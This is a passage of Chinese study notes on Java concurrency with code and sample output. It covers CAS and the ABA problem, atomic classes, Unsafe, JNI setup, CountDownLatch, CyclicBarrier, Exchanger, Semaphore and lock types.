money.getAndAdd(-50);\n    System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）.\\n\", moneyTotal, money.get());\n  });\n  t1.start();\n\n  Thread t2 = new Thread(() -> {\n    try {\n      TimeUnit.SECONDS.sleep(2);\n    } catch (InterruptedException e) {\n      e.printStackTrace();\n    }\n    money.getAndAdd(-50);\n    System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）.\\n\", moneyTotal, money.get());\n  });\n  t2.start();\n\n  Thread t3 = new Thread(() -> {\n    money.getAndAdd(50);\n    System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）.\\n\", moneyTotal, money.get());\n  });\n  t3.start();\n\n  t1.join();\n  t2.join();\n  t3.join();\n\n  // 输出50，钱数错误\n  System.out.println(money.get());\n}\n\n输出：\nThread-0-更新成功（100->50）.\nThread-2-更新成功（100->100）.\nThread-1-更新成功（100->50）.\n50\n```\n\n\n\n**`ABA`问题解决：AtomicStampedReference**\n\n**解决方法**： 在变量前面加上版本号（int），每次变量更新的时候变量的**版本号都`+1`**，即`A->B->A`就变成了`1A->2B->3A`。\n\n```java\n@Test\npublic void testAtomicStampedReference() throws InterruptedException {\n    final AtomicInteger stamp = new AtomicInteger();\n    final Integer moneyTotal = 100;\n    AtomicStampedReference money = new AtomicStampedReference(moneyTotal, 0);\n    // step1：取款50\n    final Integer moneyStep1 = moneyTotal - 50;\n    Thread t1 = new Thread(() -> {\n        if (money.compareAndSet(moneyTotal, moneyStep1, stamp.get(), stamp.incrementAndGet())) {\n            System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）:%d.\\n\", moneyTotal,\n                              money.getReference(), money.getStamp());\n        } else {\n            System.out.printf(Thread.currentThread().getName() + \"-更新失败（%d->%d）:%d.\\n\", moneyTotal,\n                              money.getReference(), money.getStamp());\n        }\n    }, \"T1\");\n    t1.start();\n\n    Thread t2 = new Thread(() -> {\n\n        TaskFactory.spend(2, TimeUnit.SECONDS);\n\n        if (money.compareAndSet(moneyTotal, moneyStep1, stamp.get(), stamp.incrementAndGet())) {\n            System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）:%d.\\n\", moneyTotal,\n                              money.getReference(), money.getStamp());\n        } else {\n            System.out.printf(Thread.currentThread().getName() + \"-更新失败（%d->%d）:%d.\\n\", moneyTotal,\n                              money.getReference(), money.getStamp());\n        }\n    }, \"T2\");\n    t2.start();\n    // step2. 他人转入50\n    final Integer moneyStep2 = moneyStep1 + 50;\n    Thread t3 = new Thread(() -> {\n        if (money.compareAndSet(moneyStep1, moneyStep2, 1, 2)) {\n            System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）:%d.\\n\", moneyTotal,\n                              money.getReference(), money.getStamp());\n        } else {\n            System.out.printf(Thread.currentThread().getName() + \"-更新成功（%d->%d）:%d.\\n\", moneyTotal,\n                              money.getReference(), money.getStamp());\n        }\n    }, \"T3\");\n    t3.start();\n\n    t1.join();\n    t2.join();\n    t3.join();\n    System.out.printf(Thread.currentThread().getName() + \"-最终（%d）:%d.\\n\", money.getReference(), money.getStamp());\n\n}\n\n输出\nT1-更新成功（100->50）:1.\nT3-更新成功（100->100）:2.\nT2-更新失败（100->100）:2.\nmain-最终（100）:2.\n```\n\n### CAS的缺点：循环时间长开销大\n\n如果`CAS`操作失败，就需要循环进行`CAS`操作(循环同时将期望值更新为最新的)，如果长时间都不成功的话，那么会造成CPU极大的开销。\n\n> 这种循环也称为自旋\n\n**解决方法**： 限制自旋次数，防止进入死循环。\n\n###  CAS的缺点：只能保证一个共享变量的原子操作\n\n`CAS`的原子操作只能针对一个共享变量。\n\n**解决方法**： 如果需要对多个共享变量进行操作，可以使用加锁方式(悲观锁)保证原子性，或者可以把多个共享变量合并成一个共享变量进行`CAS`操作。\n\n\n\n### CAS的应用\n\n我们知道`CAS`操作并不会锁住共享变量，也就是一种**非阻塞**的同步机制，`CAS`就是乐观锁的实现。\n\n1.  **乐观锁**总是假设最好的情况，每次去操作数据都认为不会被别的线程修改数据，**所以在每次操作数据的时候都不会给数据加锁**，即在线程对数据进行操作的时候，**别的线程不会阻塞**仍然可以对数据进行操作，只有在需要更新数据的时候才会去判断数据是否被别的线程修改过，如果数据被修改过则会拒绝操作并且返回错误信息给用户。\n2.  **悲观锁**总是假设最坏的情况，每次去操作数据时候都认为会被的线程修改数据，**所以在每次操作数据的时候都会给数据加锁**，让别的线程无法操作这个数据，别的线程会一直阻塞直到获取到这个数据的锁。这样的话就会影响效率，比如当有个线程发生一个很耗时的操作的时候，别的线程只是想获取这个数据的值而已都要等待很久。\n\n`Java`利用`CAS`的乐观锁、原子性的特性高效解决了多线程的安全性问题，例如JDK1.8中的集合类`ConcurrentHashMap`、关键字`volatile`、`ReentrantLock`等。\n\n## AtomicLong\n\n- 区别于AtomicInteger：VM_SUPPORTS_LONG_CAS：虚拟机是否支持 CAS 操作\n\n  ```java\n      /**\n       * Records whether the underlying JVM supports lockless\n       * compareAndSwap for longs. While the Unsafe.compareAndSwapLong\n       * method works in either case, some constructions should be\n       * handled at Java level to avoid locking user-visible locks.\n       */\n      static final boolean VM_SUPPORTS_LONG_CAS = VMSupportsCS8();\n  \n      /**\n       * Returns whether underlying JVM supports lockless CompareAndSet\n       * for longs. Called only once and cached in VM_SUPPORTS_LONG_CAS.\n       */\n      private static native boolean VMSupportsCS8();\n  ```\n\n\n\n## AtomicReference\n\nreference的地址为int类型\n\n## AtomicXXXFieldUpdater\n\n使用AtomicXXXFieldUpdater的原因：\n\n- 想让类的操作属性具备原子性的条件\n  1. 类的属性是volatile（ Must be volatile type）\n  2. ==非当前类调用，则非private、protected==\n  3. 类型必须一致\n\n\n- 不想使用锁（包括显示锁、重量级锁Synchronized）\n- 大量需要原子类型修饰的对象，比较消耗资源\n\n\n\n```java\npublic class AtomicIntegerFieldUpdaterTest {\n    @Test\n    public void test() {\n        AtomicIntegerFieldUpdater<TestBean> updater = AtomicIntegerFieldUpdater.newUpdater(TestBean.class, \"param\");\n        TestBean test = new TestBean();\n        updater.incrementAndGet(test);\n        System.out.println(updater.get(test));\n    }\n\n    class TestBean {\n        // 非本类调用，param 不可设置未private、protected\n        volatile int param;\n    }\n}\n```\n\n## Unsafe\n\n​\t java 调用C++/C 再 调用汇编\n\n### 几种Counter方案的性能对比。\n\n```java\nimport sun.misc.Unsafe;\n\nimport java.lang.reflect.Field;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.function.Consumer;\n\npublic class UnsafeTest {\n    private static final int THREAD_COUNT = 1000;\n    private static final int MAX_NUM = 10000;\n\n    public static void main(String[] args) {\n        doAction(getAction(), new VolatileCounter(), \"Volatile\");\n        doAction(getAction(), new AtomicCounter(), \"Executors\");\n        doAction(getAction(), new SynCounter(), \"Sync\");\n        doAction(getAction(), new LockCounter(), \"Lock\");\n        doAction(getAction(), new CasCounter(), \"Cas\");\n\n    }\n\n    private static Consumer<Counter> getAction() {\n        Consumer<Counter> action = param -> {\n            ExecutorService executorService = Executors.newFixedThreadPool(THREAD_COUNT);\n            for (int i = 0; i < THREAD_COUNT; i++) {\n                executorService.submit(new CounterRunnable(param, MAX_NUM));\n            }\n            executorService.shutdown();\n            try {\n                // 不可省略，需要等待执行线程运行结束\n                // 一般情况下awaitTermination和shutdown配合使用，shutdown之后调用awaitTermination\n                // 如果注释掉shutdown方法，则awaitTermination不会监视到线程池关闭的信息 所以在这个地方代码会堵塞，\n                // 如果注释掉awaitTermination方法，则后面的代码不会得到线程执行过的结果\n                executorService.awaitTermination(1, TimeUnit.HOURS);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        };\n        return action;\n    }\n\n    /**\n     * 统计运行时长\n     *\n     * @param action\n     * @param counter\n     */\n    private static void doAction(Consumer<Counter> action, Counter counter, String tag) {\n        long begin = System.currentTimeMillis();\n        // 任务执行\n        action.accept(counter);\n        long end = System.currentTimeMillis();\n        System.out.println(tag + \" counter result: \" + counter.getCounter() + \" and time passed in ms: \" + (end - begin));\n    }\n\n    interface Counter {\n        void increment();\n\n        long getCounter();\n    }\n\n\n    static class VolatileCounter implements Counter {\n        private volatile int counter;\n\n        @Override\n        public void increment() {\n            ++counter;\n        }\n\n        @Override\n        public long getCounter() {\n            return counter;\n        }\n    }\n\n    static class AtomicCounter implements Counter {\n        private AtomicInteger counter = new AtomicInteger(0);\n\n        @Override\n        public void increment() {\n            counter.incrementAndGet();\n        }\n\n        @Override\n        public long getCounter() {\n            return counter.get();\n        }\n    }\n\n    static class SynCounter implements Counter {\n        private int counter = 0;\n\n        @Override\n        public synchronized void increment() {\n            ++counter;\n        }\n\n        @Override\n        public long getCounter() {\n            return counter;\n        }\n    }\n\n\n    static class LockCounter implements Counter {\n        private int counter = 0;\n        private Lock lock = new ReentrantLock();\n\n        @Override\n        public void increment() {\n            try {\n                lock.lock();\n                ++counter;\n            } finally {\n                lock.unlock();\n            }\n        }\n\n        @Override\n        public long getCounter() {\n            return counter;\n        }\n    }\n\n    static class CasCounter implements Counter {\n        private int counter = 0;\n        private static final Unsafe unsafe = getUnsafe();\n        private static final long valueOffset;\n\n        static {\n            try {\n                valueOffset = unsafe.objectFieldOffset(CasCounter.class.getDeclaredField(\"counter\"));\n            } catch (Exception ex) {\n                throw new Error(ex);\n            }\n        }\n\n\n        @Override\n        public void increment() {\n            int expect = counter;\n            while (!unsafe.compareAndSwapInt(this, valueOffset, expect, expect + 1)) {\n                expect = counter;\n            }\n        }\n\n        @Override\n        public long getCounter() {\n            return counter;\n        }\n\n        private static Unsafe getUnsafe() {\n            try {\n                Field unsafe = Unsafe.class.getDeclaredField(\"theUnsafe\");\n                unsafe.setAccessible(true);\n                return (Unsafe) unsafe.get(null);\n            } catch (Exception e) {\n                throw new RuntimeException(e);\n            }\n        }\n    }\n\n    static class CounterRunnable implements Runnable {\n        private final Counter counter;\n        private final int num;\n\n        CounterRunnable(Counter counter, int num) {\n            this.counter = counter;\n            this.num = num;\n        }\n\n        @Override\n        public void run() {\n            synchronized (counter) {\n                for (int i = 0; i < num; i++) {\n                    counter.increment();\n                }\n            }\n        }\n    }\n}\n```\n\n执行结果\n\n```java\nVolatile counter result: 10000000 and time passed in ms: 177\nExecutors counter result: 10000000 and time passed in ms: 183\nSync counter result: 10000000 and time passed in ms: 1111\nLock counter result: 10000000 and time passed in ms: 204\nCas counter result: 10000000 and time passed in ms: 114\n```\n\n### Java 调用 C 流程（JNI ）\n\n1. 创建目录`jni`\n\n2. 创建文件`Hello.java`\n\n   ```java\n   public class Hello{\n   \tstatic{\n   \t\t// 加载动态链接库\n   \t\tSystem.loadLibrary(\"hello\");\n   \t}\n   \t\n   \t// 本地方法\n   \tpublic native void hi();\n   \t\n   \tpublic static void main(String[] args){\n   \t\tnew Hello().hi();\n   \t}\n   }\n   ```\n\n3. 编译Java文件`javac Hello.java`\n\n   ![image-20220222105628308](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222105628308-1667231117133-83.png) \n\n4. 使用命令`javah -jni Hello`生成头文件`Hello.h`（C的header文件）\n\n   ![image-20220222105835195](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222105835195-1667231117133-84.png) \n\n   \n\n   Hello.h内容如下\n\n   ```C\n   /* DO NOT EDIT THIS FILE - it is machine generated */\n   #include <jni.h>\n   /* Header for class Hello */\n   \n   #ifndef _Included_Hello\n   #define _Included_Hello\n   #ifdef __cplusplus\n   extern \"C\" {\n   #endif\n   /*\n    * Class:     Hello\n    * Method:    hi\n    * Signature: ()V\n    */\n   JNIEXPORT void JNICALL Java_Hello_hi\n     (JNIEnv *, jobject);\n   \n   #ifdef __cplusplus\n   }\n   #endif\n   #endif\n   \n   ```\n\n5. 编写C程序：`Hello.c`，也就是上面header文件中方法的实现\n\n   ```c\n   #include <jni.h>\n   #include \"Hello.h\"\n   \n   JNIEXPORT void JNICALL Java_Hello_hi (JNIEnv * env, jobject o){\n   \tprintf(\"Say hi.\\n\");\n   };\n   ```\n\n6. 查看`ls -l $JAVA_HOME/include`\n\n7. 编译C文件`gcc -fPIC  -I\"$JAVA_HOME/include\" -I\"$JAVA_HOME/include/linux\" -c Hello.c`，生成了`Hello.o`的目标文件\n\n8. 生成\"hello\" 的动态链接库 `gcc -shared Hello.o -o libhello.so`， 生成了`libhello.so`（`lib` 是linux约定俗成的前缀）\n\n9. 运行java文件：`java Hello`，报错\n\n   ```java\n   Exception in thread \"main\" java.lang.UnsatisfiedLinkError: no hello in java.library.path\n   \tat java.lang.ClassLoader.loadLibrary(ClassLoader.java:1867)\n   \tat java.lang.Runtime.loadLibrary0(Runtime.java:870)\n   \tat java.lang.System.loadLibrary(System.java:1122)\n   \tat Hello.<clinit>(Hello.java:4)\n   ```\n\n10. 配置`java.library.path`. 临时生效：`export LD_LIBRARY_PATH=.`\n\n    ![image-20220222113453875](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222113453875-1667231117133-86.png) \n\n11. 重新运行：`java Hello`\n\n    ![image-20220222113625291](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222113625291-1667231117133-85.png) \n\n\n\n## 底层汇编相关指令\n\n> compareAndSwapInt -> cmpxchg1\n>\n> compareAndSwapLong -> cmpxchg\n>\n> putOrderedInt -> xchg1\n>\n> compareAndSwapObject -> cmpxchgq\n\n# CountDownLatch\n\n```java\nA synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.\n“允许一个或多个线程等待，直到在其他线程中执行的一组操作完成”的同步算法\n```\n\n## 退出条件\n\n1. countDown() 减到0：`await()`\n2. 等待时间到了截止时间：`await(long timeout, TimeUnit unit)`\n\n## 使用场景\n\n### 等待所有线程执行完成\n\n```java\npackage hots.utils;\n\nimport java.util.Random;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.stream.IntStream;\n\npublic class CountDownLatchTest {\n    private final static AtomicInteger count = new AtomicInteger();\n    private final static Random random = new Random();\n\n    private static CountDownLatch latch;\n    private static ExecutorService executorService = Executors.newFixedThreadPool(2);\n\n    public static void main(String[] args) throws InterruptedException {\n        // step1: 获取查询数据\n        int[] data = IntStream.rangeClosed(1, 5).map(e -> random.nextInt(1_000)).toArray();\n        latch = new CountDownLatch(data.length);\n\n        // step2：根据查询数据分配多个线程执行\n        for (int i = 0; i < data.length; i++) {\n            executorService.submit(new SimpleRunnable(latch, count, i, data[i]));\n        }\n        System.out.printf(\"All works submitted.\\n\");\n        latch.await();\n\n        executorService.shutdown();\n        // step3\n        System.out.printf(\"All works finished. Support with [%d] threads.\\n\", count.get());\n\n    }\n\n    private static class SimpleRunnable implements Runnable {\n        private final int index;\n        private final int param;\n        private final CountDownLatch latch;\n        private final AtomicInteger count;\n\n        SimpleRunnable(CountDownLatch latch, AtomicInteger count, int index, int param) {\n            this.index = index;\n            this.param = param;\n            this.count = count;\n            this.latch = latch;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(100);\n                System.out.printf(\"%s deal with [%d]-[%d] \\n\", Thread.currentThread().getName(), index, param);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                count.incrementAndGet();\n                latch.countDown();\n            }\n        }\n    }\n}\n```\n\n```java\nAll works submitted.\npool-1-thread-2 deal with [1]-[546] \npool-1-thread-1 deal with [0]-[833] \npool-1-thread-2 deal with [2]-[11] \npool-1-thread-1 deal with [3]-[247] \npool-1-thread-2 deal with [4]-[191] \nAll works finished. Support with [5] threads.\n```\n\n\n\n\n\n### 任务拆分离散并行化处理\n\n业务流程如下\n\n![CountDown.drawio](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/CountDown.drawio-1667231117133-87.png) \n\n#### 基本信息定义\n\n- 统计表\n\n```java\n@Getter\n@Setter\nclass Table {\n    // 表名\n    private String tableName;\n    // 原始记录条数\n    private long sourceRecordCount = 10;\n    // 传输完成后的记录条数：验证1\n    private long targetCount;\n    // 原始schema\n    private String sourceColumnSchema = \"<table name='a'><column name='c1' type='varchar'></column></table>\";\n    // 传输完成之后的schema：验证2\n    private String targetColumnSchema = \"\";\n\n    public Table(String tableName, long sourceRecordCount) {\n        this.tableName = tableName;\n        this.sourceRecordCount = sourceRecordCount;\n    }\n}\n```\n\n- 监控工具\n\n```java\nabstract class Watcher {\n    final CountDownLatch countDownLatch;\n\n    Watcher(CountDownLatch countDownLatch) {\n        this.countDownLatch = countDownLatch;\n    }\n\n    abstract void done();\n}\n```\n\n- 事件定义（对应一次批处理任务）\n\n```java\n@Getter\n@Setter\nclass Event {\n    private String eventName;\n\n    public Event(String eventName) {\n        this.eventName = eventName;\n    }\n}\n```\n\n- 批处理任务完成验证\n\n```java\npublic class EventTaskBatch extends Watcher {\n    private final Event event;\n\n    EventTaskBatch(Event event, int taskSize) {\n        super(new CountDownLatch(taskSize));\n        this.event = event;\n    }\n\n    @Override\n    void done() {\n        countDownLatch.countDown();\n        if (countDownLatch.getCount() == 0) {\n            // Event涉及到的所有Table任务完成\n            System.out.println(\"All table of event \" + event.getEventName() + \" is finished verify and update continue.\");\n            System.out.println();\n        }\n    }\n}\n```\n\n- 批处理表验证任务全部完成\n\n```java\nclass TableTaskBatch extends Watcher {\n    private final Table table;\n\n    /* 每张表存在多个验证任务 */\n    private EventTaskBatch eventTaskBatch;\n\n    TableTaskBatch(EventTaskBatch eventTaskBatch, Table table, int taskSize) {\n        super(new CountDownLatch(taskSize));\n        this.table = table;\n        this.eventTaskBatch = eventTaskBatch;\n    }\n\n    @Override\n    public void done() {\n        countDownLatch.countDown();\n        if (countDownLatch.getCount() == 0) {\n            // Table相关所有任务完成\n            System.out.println(\"All tasks of \" + table.getTableName() + \" is finished verify and update continue.\");\n            eventTaskBatch.done();\n        }\n    }\n}\n```\n\n- 表数据验证行为\n\n```java\nabstract class TableVerify implements Runnable {\n\n    protected final Table table;\n\n    protected final TableTaskBatch tableTaskBatch;\n\n    public TableVerify(Table table, TableTaskBatch tableTaskBatch) {\n        this.table = table;\n        this.tableTaskBatch = tableTaskBatch;\n    }\n}\n```\n\n​\t\ta) 验证1：验证数据量\n\n```java\nclass TrustSourceRecordCount extends TableVerify{\n    TrustSourceRecordCount(Table table, TableTaskBatch tableTaskBatch) {\n        super(table, tableTaskBatch);\n    }\n\n    @Override\n    public void run() {\n        TaskFactory.spend(ThreadLocalRandom.current().nextInt(10), TimeUnit.SECONDS);\n        // 设置传输完成之后的数据量\n        table.setTargetCount(table.getSourceRecordCount());\n        // 完成一次一张表的验证完成计数\n        tableTaskBatch.done();\n    }\n}\n```\n\n​\t\tb) 验证2：验证表结构\n\n```java\nclass TrustSourceColumns extends TableVerify {\n    TrustSourceColumns(Table table, TableTaskBatch tableTaskBatch) {\n        super(table, tableTaskBatch);\n    }\n\n    @Override\n    public void run() {\n        TaskFactory.spend(ThreadLocalRandom.current().nextInt(10), TimeUnit.SECONDS);\n        table.setTargetColumnSchema(table.getSourceColumnSchema());\n        // 完成一次一张表的验证完成计数\n        tableTaskBatch.done();\n    }\n}\n```\n\n- 测试类\n\n```java\npublic class CountDownLatchTest {\n\n    public static void main(String[] args) {\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n        try {\n            // 不同数据源的数据，批处理\n            Event[] events = {new Event(\"Event-1\"), new Event(\"Event-2\")};\n            for (Event event : events) {\n                // 获取数据源表资源概况\n                List<Table> tables = capture(event);\n                EventTaskBatch eventTaskBatch = new EventTaskBatch(event, tables.size());\n                for (Table table : tables) {\n                    // 与Table相关的任务技术监控。\n                    TableTaskBatch tableTaskBatch = new TableTaskBatch(eventTaskBatch, table, 2);\n                    executorService.submit(new TrustSourceRecordCount(table, tableTaskBatch));\n                    executorService.submit(new TrustSourceColumns(table, tableTaskBatch));\n                }\n            }\n        } finally {\n            executorService.shutdown();\n        }\n\n    }\n\n    private static List<Table> capture(Event event) {\n        List<Table> list = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            list.add(new Table(event.getEventName() + \"-Table-\" + i, i * 1000));\n        }\n        return list;\n    }\n}\n```\n\n 测试结果\n\n```\nAll tasks of Event-1-Table-3 is finished verify and update continue.\nAll tasks of Event-1-Table-1 is finished verify and update continue.\nAll tasks of Event-1-Table-4 is finished verify and update continue.\nAll tasks of Event-1-Table-6 is finished verify and update continue.\nAll tasks of Event-1-Table-5 is finished verify and update continue.\nAll tasks of Event-1-Table-2 is finished verify and update continue.\nAll tasks of Event-1-Table-0 is finished verify and update continue.\nAll tasks of Event-1-Table-7 is finished verify and update continue.\nAll tasks of Event-1-Table-8 is finished verify and update continue.\nAll tasks of Event-2-Table-4 is finished verify and update continue.\nAll tasks of Event-2-Table-2 is finished verify and update continue.\nAll tasks of Event-2-Table-6 is finished verify and update continue.\nAll tasks of Event-2-Table-3 is finished verify and update continue.\nAll tasks of Event-2-Table-0 is finished verify and update continue.\nAll tasks of Event-1-Table-9 is finished verify and update continue.\nAll table of event Event-1 is finished verify and update continue.\n\nAll tasks of Event-2-Table-1 is finished verify and update continue.\nAll tasks of Event-2-Table-7 is finished verify and update continue.\nAll tasks of Event-2-Table-9 is finished verify and update continue.\nAll tasks of Event-2-Table-8 is finished verify and update continue.\nAll tasks of Event-2-Table-5 is finished verify and update continue.\nAll table of event Event-2 is finished verify and update continue.\n```\n\n结果分析\n\n1. 每个**table**的所有验证完成，执行`TableTaskBatch`的`done`中的后续操作\n2. 每个**event**的所有**table**的验证完成，执行`EventTaskBatch`的`done`中的后续操作\n\n# CyclicBarrier\n\n```tex\nA synchronization aid that allows a set of threads to all wait for each other to reach a common barrier point. \n“允许一组线程互相等待到达一个共同的屏障点”的同步算法\n```\n\n\n\n```java\npublic class CyclicBarrierExample1 {\n\n    public static void main(String[] args) {\n        CyclicBarrier barrier = new CyclicBarrier(4, () -> {\n            System.out.println(\"All parties action finished\");\n        });\n        new Thread(new ActionRunnable(barrier), \"T1\").start();\n        new Thread(new ActionRunnable(barrier), \"T2\").start();\n        new Thread(new ActionRunnable(barrier), \"T3\").start();\n        new Thread(new ActionRunnable(barrier), \"T4\").start();\n    }\n\n    private static class ActionRunnable implements Runnable {\n        private final CyclicBarrier barrier;\n\n        public ActionRunnable(CyclicBarrier barrier) {\n            this.barrier = barrier;\n        }\n\n        @Override\n        public void run() {\n            try {\n                TaskFactory.spend(ThreadLocalRandom.current().nextInt(10), TimeUnit.SECONDS, false, true);\n                barrier.await();\n                System.out.println(Thread.currentThread().getName() + \"- await finished\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } catch (BrokenBarrierException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n测试结果：\n\n```\nT1 finnish task（1651682474323）\nT4 finnish task（1651682475329）\nT3 finnish task（1651682480338）\nT2 finnish task（1651682482329）\nAll parties action finished\nT2- await finished\nT1- await finished\nT4- await finished\nT3- await finished\n```\n\n## 示例2：使用reset()重置\n\n```java\npublic static void main(String[] args) {\n    CyclicBarrier barrier = new CyclicBarrier(2, () -> {\n        System.out.println(\"All parties action finished\");\n    });\n    new Thread(new ActionRunnable(barrier), \"T1\").start();\n    new Thread(new ActionRunnable(barrier), \"T2\").start();\n\n    TaskFactory.spendSeconds(6);\n    System.out.println(barrier.getNumberWaiting());\n\n    barrier.reset();\n    TaskFactory.spendSeconds(2);\n    System.out.println(barrier.getNumberWaiting());\n}\n```\n\n## CountDownLatch 和 CyclicBarrier 的区别\n\n| CountDownLatch                     | CyclicBarrier                        |\n| ---------------------------------- | ------------------------------------ |\n| 不可 reset                         | 可以循环使用的                       |\n| CountDownLatch工作线程之间互不关心 | 工作线程互相等待到达一个共同的屏障点 |\n\n# \tExchanger\n\n1. 需要成对出现，否则单出来的一个线程同样会进入阻塞状态\n2. 如果成对的线程，其中一个无法到达“`交换点（Exchange Point）`”，另一个会一直等待，直到超时/一直阻塞。\n3. **线程对之间交换的对象，是同一个地址的引用，会存在线程不安全的问题**，可以考虑使用Atomic包装。\n\n```java\n一个同步点，在这个同步点上，线程之间可以组队并互相交换数据。每个线程会在进入交换方法时提供给伙伴线程匹配一些对象，并在返回时接收其伙伴的提供的对象。一个交换器可以被看作是一个同步队列的双向形式。交换器在遗传算法和流水线设计等应用中可能是有用的。\n```\n\n```java\nimport java.util.concurrent.Exchanger;\nimport java.util.concurrent.TimeUnit;\n\npublic class ExchangerText {\n    public static void main(String[] args) {\n        final Exchanger<String> exchanger = new Exchanger<>();\n\n        new Thread(() -> {\n            TaskFactory.spend(3, TimeUnit.SECONDS, true);\n            try {\n                // 交换点，成对的线程同时达到这个交换点才会交换数据\n                String msg = exchanger.exchange(\"（message from \" + Thread.currentThread().getName() + \".）\");\n                System.out.println(Thread.currentThread().getName() + \" got \" + msg + \"[\" + System.currentTimeMillis() + \"]\");\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }, \"T-A\").start();\n\n        new Thread(() -> {\n            TaskFactory.spend(10, TimeUnit.SECONDS, true);\n            try {\n                // 交换点，成对的线程同时达到这个交换点才会交换数据\n                String msg = exchanger.exchange(\"（message from \" + Thread.currentThread().getName() + \".）\");\n                System.out.println(Thread.currentThread().getName() + \" got \" + msg + \"[\" + System.currentTimeMillis() + \"]\");\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }, \"T-B\").start();\n    }\n}\n\n输出结果：\nT-A finnish task（1651715733432）\nT-B finnish task（1651715740432）\nT-B got （message from T-A.）[1651715740432]\nT-A got （message from T-B.）[1651715740432]\n```\n\n# Semaphore\n\n注册/回收许可证\n\n1. `acquire()/release()` ： 相当于 acquire(1)/release(1)\n\n2. `acquire(int permits) /release(int permits)`\n\n3. `acquireUninterruptibly()/acquireUninterruptibly(int permits) ` 不可打断，不会抛出InterruptedException异常\n\n4. `drainPermits()` 获取所有的许可证\n\n5. `tryAcquire()/tryAcquire(int permits)`  不可打断，不会抛出InterruptedException异常，拿不到许可证，不会阻塞，放弃获取，继续执行\n\n6. `getQueueLength()` 返回等待获取的线程数的评估值\n\n7. `availablePermits()`返回此信号量中可用的当前许可数（评估值）\n\n- DEMO-1：可中断的许可证请求（会抛出InterruptedException）\n\n```java\npublic class SemaphoreExample {\n    public static void main(String[] args) {\n        final Semaphore semaphore = new Semaphore(1);\n        new Thread(new TaskRunnable(semaphore), \"T1\").start();\n        new Thread(new TaskRunnable(semaphore), \"T2\").start();\n    }\n\n    static class TaskRunnable implements Runnable {\n        private final Semaphore semaphore;\n        TaskRunnable(Semaphore semaphore) {\n            this.semaphore = semaphore;\n        }\n        @Override\n        public void run() {\n            try {\n                System.out.println(Thread.currentThread().getName() +  \" ask for permits\");\n                // 请求执行许可证\n                semaphore.acquire();\n                System.out.println(Thread.currentThread().getName() +  \" got permits\");\n                TaskFactory.spend(10, TimeUnit.SECONDS, true);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            } finally {\n                // 释放许可证\n                semaphore.release();\n            }\n        }\n    }\n}\n\n```\n\n```tcl\nT1 ask for permits\nT1 got permits\nT2 ask for permits\nT1 finnish task [1651772544344]\nT2 got permits\nT2 finnish task [1651772549361]\n```\n\n- DEMO-2\n\n```java\npublic class SemaphoreExample2 {\n    public static void main(String[] args) {\n        final Semaphore semaphore = new Semaphore(1);\n        new Thread(new TaskRunnable(semaphore), \"T1\").start();\n        new Thread(new TaskRunnable(semaphore), \"T2\").start();\n    }\n\n    static class TaskRunnable implements Runnable {\n        private final Semaphore semaphore;\n        TaskRunnable(Semaphore semaphore) {\n            this.semaphore = semaphore;\n        }\n        @Override\n        public void run() {\n            try {\n                // 请求执行许可证\n                System.out.println(Thread.currentThread().getName() +  \" ask for permits\");\n                boolean tryResult = semaphore.tryAcquire();\n                System.out.println(Thread.currentThread().getName() +  (tryResult ? \" got permits\" : \" ignore permits and continue\"));\n                TaskFactory.spend(2, TimeUnit.SECONDS, true);\n            } finally {\n                // 释放许可证\n                semaphore.release();\n            }\n        }\n    }\n}\n```\n\n```\nT2 ask for permits\nT1 ask for permits\nT2 got permits\nT1 ignore permits and continue\nT1 finnish task [1651774206609]\nT2 finnish task [1651774206609]\n```\n\n# Lock包\n\n> >  java中常见锁分类\n>\n> - 公平锁和非公平锁\n>\n>   根据多线程竞争时是否排队依次获取锁，synchronized和ReentrantLock实现默认都是非公平锁，非公平锁可以提高效率，避免线程唤醒带来的空档期\n>\n> - 可重入锁和不可重复锁\n>\n>   根据同一个线程是否能重复获取同一把锁\n>\n> - 共享锁和独占锁(排他锁)\n>\n>   根据多线程是否能共享一把锁，典型的比如ReentrantReadWriteLock，其中读锁是共享锁，写锁是排他锁\n>\n> - 可中断锁和不可中断锁\n>\n>   根据正在尝试获取锁的线程是否可中断\n>\n> - 悲观锁和乐观锁\n>\n>   根据线程是否锁住共享资源\n>\n> - 自旋锁和阻塞锁\n>\n>   根据线程等待的过程\n\n## ReentrantLock\n\nReentrantLock特点：作用同Synchronized，但是拥有一些独有的特性\n\n- 可重入：ReentrantLock同步块对同一条线程来说是可重入的，不会出现自己把自己锁死的问题\n- 阻塞同步：在成功获取锁的线程执行完之前，会阻塞后面其它线程进入\n- <font color='red'>等待可中断</font>：持有锁的线程长期不释放锁时，正在等待获取锁的线程可以选择放弃等待，改为处理其它事情，主要是tryLock(time)、lockInterruptibly()方法响应支持\n\n- <font color=\"red\">实现公平锁</font>：通过new 